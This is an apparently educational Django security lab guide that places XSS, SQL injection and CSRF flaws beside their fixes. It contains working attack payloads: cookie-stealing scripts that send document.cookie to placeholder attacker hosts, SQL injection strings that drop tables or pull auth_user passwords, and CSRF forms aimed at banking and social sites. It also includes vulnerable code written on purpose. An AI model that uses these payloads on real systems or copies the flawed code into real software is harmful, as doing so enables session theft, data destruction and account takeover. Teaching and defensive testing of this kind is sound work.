# Security Vulnerabilities Testing Guide

# Sangmo Lama - Django Notes CRUD Application

---

## 📋 Overview

This document provides detailed analysis and testing instructions for three critical web application vulnerabilities:

1. **Cross-Site Scripting (XSS)**
2. **SQL Injection (SQLi)**
3. **Cross-Site Request Forgery (CSRF)**

Each vulnerability includes:

- Vulnerability explanation
- Attack payloads
- Testing steps
- Evidence of impact
- Prevention strategies

---

## 🔗 Access the Testing Interface

**URL:** `http://localhost:8000/security/`

This dashboard provides side-by-side comparison of vulnerable vs. protected implementations.

---

## 1. CROSS-SITE SCRIPTING (XSS) VULNERABILITY

### What is XSS?

Cross-Site Scripting (XSS) is an injection attack that allows an attacker to execute arbitrary JavaScript code in the context of a victim's browser. The injected script can:

- Steal session cookies
- Capture keystrokes
- Redirect users to malicious sites
- Deface the web page
- Perform actions on behalf of the user

### Types of XSS:

1. **Stored XSS** (Database XSS)
   - Malicious code is stored in database
   - Executed when any user views the compromised content
   - Most dangerous type

2. **Reflected XSS**
   - Malicious code in URL parameters
   - Reflected back to user without sanitization
   - Requires user to click malicious link

3. **DOM-based XSS**
   - Client-side script processes untrusted data
   - Vulnerable JavaScript manipulates the DOM

### The Vulnerability in Our Application

**Location:** `/security/xss/vulnerable/`

**Vulnerable Code:**

```html
<!-- In template -->
<td>{{ note.title|safe }}</td>
<td>{{ note.description|safe }}</td>
```

The `|safe` filter tells Django to render the content as-is without escaping, allowing any HTML/JavaScript to execute.

### Testing XSS Vulnerability

**Step 1: Navigate to XSS Vulnerable Page**

- Go to: `http://localhost:8000/security/xss/vulnerable/`

**Step 2: Try These Payloads**

| Payload                                           | Effect                  |
| ------------------------------------------------- | ----------------------- |
| `<img src=x onerror="alert('XSS Found!')">`       | Alert popup appears     |
| `<script>alert('XSS Attack')</script>`            | Script executes         |
| `<svg/onload="alert('XSS')">`                     | SVG-based injection     |
| `<body onload="alert('XSS')">`                    | Event handler execution |
| `<iframe src="javascript:alert('XSS')"></iframe>` | iframe-based injection  |

**Step 3: Input into Form**

1. Title field: `<img src=x onerror="alert('XSS Vulnerability Confirmed!')">`
2. Description field: `This is a test of XSS vulnerability - minimum 10 characters required` (≥10 chars)
3. Click Submit

**Expected Result:**

- ✓ Alert popup appears immediately on redirect
- ✓ Malicious code is stored in database
- ✓ Alert appears every time page is loaded (Stored XSS)

### Evidence of Impact

**Cookie Theft Example:**

```javascript
<img src=x onerror="fetch('http://attacker.com/steal.php?cookie='+document.cookie)">
```

This payload would send the victim's session cookie to the attacker's server.

**Session Hijacking Example:**

```javascript
<script>
  new Image().src='http://evil.com/log.php?data='+
  document.location+':'+document.cookie;
</script>
```

### Protected Implementation

**Location:** `/security/xss/safe/`

**Protected Code:**

```html
<!-- Django auto-escaping enabled (default) -->
<td>{{ note.title }}</td>
<td>{{ note.description }}</td>
```

**How It Works:**

- Django escapes special HTML characters by default
- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `"` becomes `&quot;`
- Browser renders it as plain text, not executable code

### Prevention Strategies

1. **Always use Django's auto-escaping** (enabled by default)
2. **Never use `|safe` filter** unless you've sanitized the content
3. **Use `|escape` filter explicitly** for extra safety
4. **Content Security Policy (CSP):**
   ```python
   SECURE_CONTENT_SECURITY_POLICY = {
       "default-src": ("'self'",),
       "script-src": ("'self'",),
   }
   ```
5. **Input validation:** Validate input type and format
6. **Output encoding:** Use proper encoding for context (HTML, JavaScript, URL, CSS)
7. **Use security libraries:** django-bleach for HTML sanitization

### Testing Screenshot Points

1. **Vulnerable Page:** Show alert popup executing
2. **View Page Source:** Demonstrate `|safe` filter in template
3. **Safe Page:** Same payload fails silently
4. **Browser DevTools:** Show escaped HTML entities

---

## 2. SQL INJECTION VULNERABILITY

### What is SQL Injection?

SQL Injection is an attack where an attacker inserts or "injects" malicious SQL code into an entry field. This causes the SQL query to execute unintended commands in the database, allowing attackers to:

- Extract sensitive data
- Modify or delete database records
- Bypass authentication
- Escalate privileges
- Execute OS commands (in some cases)

### SQL Injection Techniques:

1. **Union-based SQLi**
   - Appends UNION SELECT to extract data
   - Requires knowledge of table structure

2. **Blind SQL Injection**
   - No visible output from query
   - Uses boolean logic to extract data bit-by-bit

3. **Time-based Blind SQLi**
   - Database response time indicates true/false
   - Uses SLEEP() or WAITFOR DELAY

4. **Error-based SQLi**
   - Exploits database error messages
   - Reveals table/column information

### The Vulnerability in Our Application

**Location:** `/security/sql-injection/vulnerable/`

**Vulnerable Code:**

```python
def sql_injection_demo(request):
    if request.method == 'POST':
        title = request.POST.get('title', '')
        description = request.POST.get('description', '')

        # VULNERABLE: String concatenation in SQL
        sql = f"""
        INSERT INTO notes_note (title, description)
        VALUES ('{title}', '{description}');
        """

        with connection.cursor() as cursor:
            cursor.execute(sql)  # DANGER!
```

The problem: User input directly concatenated into SQL string without parameterization.

### Testing SQL Injection Vulnerability

**Step 1: Navigate to SQL Injection Vulnerable Page**

- Go to: `http://localhost:8000/security/sql-injection/vulnerable/`

**Step 2: Try These Payloads**

| Payload                                              | Effect                          |
| ---------------------------------------------------- | ------------------------------- |
| `Normal'); --`                                       | Closes string and comments rest |
| `' OR '1'='1`                                        | Makes condition always true     |
| `'); DROP TABLE notes_note; --`                      | Attempts to delete table        |
| `' UNION SELECT username,password FROM auth_user --` | Data extraction                 |
| `'; WAITFOR DELAY '00:00:05'; --`                    | Time-based blind injection      |

**Step 3: Input into Form**

**Test Case 1: Comment Injection**

```
Title: Test'); --
Description: This is a comment injection test (≥10 chars)
```

**Expected Result:**

- The -- comments out the rest of the SQL
- Query becomes: `INSERT INTO notes_note (title, description) VALUES ('Test'); --'...`
- Only first INSERT executes
- Note: This may not show visible error but SQL is executed differently

**Test Case 2: Data Extraction (if SQLite allows)**

```
Title: ' OR 1=1; --
Description: This attempts to bypass WHERE condition (≥10 chars)
```

**Test Case 3: Error Message Analysis**

```
Title: Test' AND '1'='1
Description: This may generate SQL error showing table structure (≥10 chars)
```

### Real-World SQLi Attack Examples

**Authentication Bypass:**

```
Username: admin' --
Password: anything
# SQL becomes: SELECT * FROM users WHERE username='admin' --' AND password='...'
# Comment removes password check, logs in as admin
```

**All Users Extraction:**

```
Title: ' UNION SELECT username, password FROM auth_user --
Description: Extract all user credentials
```

**Data Destruction:**

```
Title: Test'); DELETE FROM notes_note; --
Description: Malicious deletion attempt
```

### Protected Implementation

**Location:** `/security/sql-injection/safe/`

**Protected Code:**

```python
def sql_injection_safe(request):
    if request.method == 'POST':
        title = request.POST.get('title', '')
        description = request.POST.get('description', '')

        # SAFE: Using parameterized queries
        sql = "INSERT INTO notes_note (title, description) VALUES (%s, %s);"

        with connection.cursor() as cursor:
            cursor.execute(sql, [title, description])  # Parameters separate from SQL
```

**Or Better Yet (Django ORM):**

```python
Note.objects.create(title=title, description=description)
```

**How Parameterized Queries Work:**

1. SQL template is fixed: `INSERT INTO notes_note VALUES (%s, %s)`
2. User input passed separately: `[title, description]`
3. Database driver escapes special characters
4. SQL code and data are never mixed
5. Injection attempts are treated as literal text

### Example Injection Attempt with Safe Code

```
Input: Test'); DROP TABLE notes_note; --

SQL: INSERT INTO notes_note (title, description) VALUES (%s, %s)
With parameters: ['Test'); DROP TABLE notes_note; --', 'description']

Result: Stored as literal string
Data in DB: "Test'); DROP TABLE notes_note; --"
No table is dropped - it's just text!
```

### Prevention Strategies

1. **Always use parameterized queries (prepared statements)**
2. **Use Django ORM** instead of raw SQL when possible
3. **Input validation** - validate type and format
4. **Least Privilege** - database user should have minimal permissions
5. **Error handling** - don't expose database errors to users
6. **Web Application Firewall (WAF)** - detect and block injection attempts
7. **Regular backups** - helps recovery if attack succeeds
8. **SQL code review** - audit all SQL-related code

### Detection Methods

**Check for vulnerabilities:**

```python
# Bad - VULNERABLE
sql = "SELECT * FROM users WHERE id = '" + user_input + "'"

# Good - SAFE
sql = "SELECT * FROM users WHERE id = %s"
cursor.execute(sql, [user_input])

# Best - SAFE & Pythonic
User.objects.filter(id=user_input)
```

### Testing Screenshot Points

1. **Vulnerable Form:** Show input fields
2. **Error Messages:** Capture any SQL errors displayed
3. **Database Result:** Demonstrate malicious data stored
4. **Safe Form:** Same payload safely stored as text
5. **Database Comparison:** Show escaped vs. unescaped data

---

## 3. CROSS-SITE REQUEST FORGERY (CSRF) VULNERABILITY

### What is CSRF?

Cross-Site Request Forgery (CSRF) is an attack where an attacker tricks an authenticated user into performing unwanted actions on another website. The attack exploits the fact that browsers automatically send cookies with requests to authenticated websites.

### CSRF Attack Requirements:

1. User must be logged into target site
2. User visits malicious website
3. Target site doesn't validate CSRF tokens
4. Action must work via simple POST/GET request
5. Browser cookie authentication is used

### How CSRF Works (Diagram):

```
1. You log into Bank.com
   ├─ Server gives you session cookie
   └─ Cookie is stored in browser

2. Without logging out, you visit Evil.com
   ├─ Evil.com contains hidden malicious code
   └─ Code submits form to Bank.com

3. Form submission to Bank.com
   ├─ Browser automatically includes your session cookie
   ├─ Server thinks it's a legitimate request from you
   └─ Action is performed (money transfer, profile change, etc.)

4. You never authorized the action!
```

### The Vulnerability in Our Application

**Location:** `/security/csrf/vulnerable/`

**Vulnerable Code:**

```python
def csrf_vulnerable_add(request):
    if request.method == 'POST':
        title = request.POST.get('title', '')
        description = request.POST.get('description', '')

        # VULNERABLE: No CSRF token validation
        Note.objects.create(title=title, description=description)
        return redirect('security:csrf-vulnerable')
```

**Vulnerable Template:**

```html
<form action="{% url 'security:csrf-vulnerable' %}" method="post">
  {# NO {% csrf_token %} - This is the vulnerability! #}
  <input type="text" name="title" />
  <textarea name="description"></textarea>
  <input type="submit" value="Submit" />
</form>
```

### Testing CSRF Vulnerability

**Step 1: Navigate to CSRF Vulnerable Page**

- Go to: `http://localhost:8000/security/csrf/vulnerable/`
- Ensure you are logged in (session exists)

**Step 2: Create Malicious HTML**

Create a file `csrf_attack.html` on your local machine:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Click to Claim Free Prize!</title>
  </head>
  <body>
    <h1>Congratulations! You've won a prize!</h1>
    <p>Click below to claim:</p>

    <form
      id="csrf-form"
      action="http://localhost:8000/security/csrf/vulnerable/"
      method="POST"
    >
      <input
        type="hidden"
        name="title"
        value="HACKED - Your account is compromised"
      />
      <input
        type="hidden"
        name="description"
        value="This note was created by a CSRF attack. The attacker exploited your authenticated session to perform unauthorized actions."
      />
      <input type="submit" value="Click Here to Claim Prize!" />
    </form>

    <!-- Auto-submit form (victim never clicks) -->
    <script>
      // Uncomment to auto-submit (more dangerous)
      // document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

**Step 3: Test the Attack**

1. Keep Notes app logged in and open in Tab 1
2. Open the `csrf_attack.html` file in Tab 2
3. Click "Click Here to Claim Prize!"
4. Go back to Tab 1 and refresh
5. Observe the malicious note was created without explicit authorization

**Step 4: Examine the Attack**

- Browser automatically included your session cookie
- No CSRF token was required or validated
- Note was created on your account
- You didn't explicitly submit the form

### Real-World CSRF Attack Scenarios

**Banking Application:**

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to_account" value="attacker_account" />
  <input type="hidden" name="amount" value="10000" />
  <input type="submit" value="Claim Your Tax Refund!" />
</form>
```

**Social Media:**

```html
<form action="https://twitter.com/compose" method="POST">
  <input type="hidden" name="text" value="I've been hacked! Don't trust me!" />
  <input type="hidden" name="post" value="1" />
</form>
```

**Email Change Attack:**

```html
<form action="https://github.com/settings/profile" method="POST">
  <input type="hidden" name="email" value="hacker@evil.com" />
  <input type="hidden" name="save" value="1" />
</form>
```

### Protected Implementation

**Location:** `/security/csrf/protected/`

**Protected Code:**

```python
def csrf_protected_add(request):
    if request.method == 'POST':
        form = NoteForm(request.POST)
        if form.is_valid():
            form.create(form.cleaned_data)
            messages.success(request, 'Note added safely (CSRF Protected)')
            return redirect('security:csrf-protected')
    else:
        form = NoteForm()

    return render(request, "notes/security/csrf_protected.html", {"form": form})
```

**Protected Template:**

```html
<form action="{% url 'security:csrf-protected' %}" method="post">
  {% csrf_token %}
  <!-- This is the protection! -->
  <input type="text" name="title" />
  <textarea name="description"></textarea>
  <input type="submit" value="Submit" />
</form>
```

**What {% csrf_token %} Renders To:**

```html
<input
  type="hidden"
  name="csrfmiddlewaretoken"
  value="9a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7p"
/>
```

### How CSRF Protection Works

**Step 1: Server generates token**

- Unique token per user session
- Token is cryptographically secure
- Token varies per request

**Step 2: Token embedded in form**

- Hidden field in every form
- Token sent with POST data

**Step 3: Token validation on server**

```
Received Token: 9a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7p
Session Token:  9a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7p
Match? YES ✓ → Process request
```

**Step 4: Attacker cannot obtain token**

- Token is session-specific
- Attacker's site cannot read it (same-origin policy)
- Even if they guess, probability is negligible
- Request is rejected with 403 Forbidden

### Why Attack Fails on Protected Version

```html
<!-- Attacker's malicious form -->
<form action="http://localhost:8000/security/csrf/protected/" method="POST">
  <input type="hidden" name="title" value="Hacked" />
  <input type="hidden" name="description" value="CSRF Attack" />
  <!-- Missing CSRF token! -->
</form>
```

**Server receives request:**

```
POST /security/csrf/protected/
title=Hacked
description=CSRF Attack
csrfmiddlewaretoken=??? (missing or invalid)

Server checks for token... NOT FOUND
Server rejects request with 403 Forbidden
Attack fails!
```

### AJAX Requests with CSRF Protection

For JavaScript/AJAX requests, include token in header:

```javascript
// Get CSRF token from page
const token = document.querySelector("[name=csrfmiddlewaretoken]").value;

// Send with fetch
fetch("/api/notes/", {
  method: "POST",
  headers: {
    "X-CSRFToken": token,
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    title: "Test Note",
    description: "CSRF Protected AJAX request",
  }),
});
```

### Prevention Strategies

1. **Always include {% csrf_token %}}** in POST forms
2. **Use POST/PUT/DELETE** for state-changing operations
3. **Keep CSRF middleware enabled** (enabled by default)
4. **Secure cookie flags:**
   ```python
   SESSION_COOKIE_SECURE = True      # HTTPS only
   SESSION_COOKIE_HTTPONLY = True    # No JavaScript access
   SESSION_COOKIE_SAMESITE = 'Strict'  # Prevent cross-site cookie sending
   ```
5. **Check Referer header** as additional protection
6. **Use double-submit cookies** pattern
7. **Short token expiration** - rotate tokens occasionally
8. **SameSite cookies** - browser prevents cookie sending cross-site

### Django Settings for CSRF Protection

```python
# settings.py

# Enable CSRF middleware (do this!)
MIDDLEWARE = [
    # ...
    'django.middleware.csrf.CsrfViewMiddleware',
    # ...
]

# Secure cookie settings
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Strict'

# CSRF settings
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SAMESITE = 'Strict'
CSRF_TRUSTED_ORIGINS = ['https://trusted-domain.com']
```

### Testing Screenshot Points

1. **Vulnerable Form:** Show missing CSRF token in HTML
2. **CSRF Token Details:** Inspect network request showing token in form data
3. **Attack Simulation:** Show malicious form without token
4. **Error Message:** 403 Forbidden when token missing
5. **Protected Form:** Show valid token in form
6. **Network Tab:** Compare token presence in requests

---

## 🧪 Complete Testing Checklist

### XSS Testing

- [ ] Navigate to vulnerable XSS page
- [ ] Submit image onerror payload
- [ ] Verify alert popup appears
- [ ] Verify payload stored in database
- [ ] Refresh page and confirm alert appears again (Stored XSS)
- [ ] View page source to see `|safe` filter
- [ ] Test safe version - payload renders as text
- [ ] Inspect HTML to see escaped entities

### SQL Injection Testing

- [ ] Navigate to vulnerable SQL injection page
- [ ] Submit comment injection payload (');--)
- [ ] Submit data extraction attempt
- [ ] Try UNION-based injection
- [ ] View page source to see string concatenation
- [ ] Test safe version - all payloads stored safely
- [ ] Compare database content between vulnerable/safe

### CSRF Testing

- [ ] Login to application
- [ ] Navigate to vulnerable CSRF page
- [ ] Create malicious HTML with hidden form
- [ ] Submit form from malicious page
- [ ] Verify note created without authorization
- [ ] View page source to see missing CSRF token
- [ ] Test protected version - attack fails with 403
- [ ] Inspect network request to see token presence

---

## 📸 Required Screenshots

### For XSS Demonstration

1. Vulnerable page form input
2. Alert popup showing "XSS Vulnerability Found!"
3. View page source showing `|safe` filter
4. Database content show HTML tags stored
5. Safe page showing same payload as escaped text
6. Browser DevTools showing HTML entities

### For SQL Injection Demonstration

1. Vulnerable page form with payload
2. Error message or unexpected behavior
3. Database query error (if visible)
4. Stored malicious data in database
5. Safe page handling same payload
6. View page source showing parameterized query

### For CSRF Demonstration

1. Vulnerable form HTML (missing CSRF token)
2. Network request showing no token
3. Malicious attacking HTML page
4. Unauthorized note creation in database
5. Protected form showing CSRF token
6. 403 Forbidden error when attacking
7. Browser DevTools showing token validation

---

## 🛡️ Security Recommendations Summary

| Vulnerability | Prevention                          | Difficulty |
| ------------- | ----------------------------------- | ---------- |
| XSS           | Use Django auto-escaping (default)  | Easy       |
| SQL Injection | Use parameterized queries           | Easy       |
| CSRF          | Include `{% csrf_token %}` in forms | Very Easy  |

### Quick Security Checklist for Developers

```python
# ❌ DON'T DO THIS
1. {% mark_safe content %}          # Never mark user input as safe
2. f"INSERT ... VALUES ('{input}')" # Never concatenate SQL
3. <form method="post">             # Never skip CSRF token

# ✅ DO THIS INSTEAD
1. {{ content }}                           # Use auto-escaping
2. cursor.execute("... VALUES (%s)", [x]) # Parameterize queries
3. <form method="post">{% csrf_token %}    # Always include token
```

---

## 📚 References

- [Django Security Documentation](https://docs.djangoproject.com/en/stable/topics/security/)
- [OWASP Top 10](https://owasp.org/Top10/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

**Document created for:** Sangmo Lama
**Testing Environment:** Django Notes CRUD Application
**Date:** 2026-03-21
**Status:** Educational & Testing Purpose Only
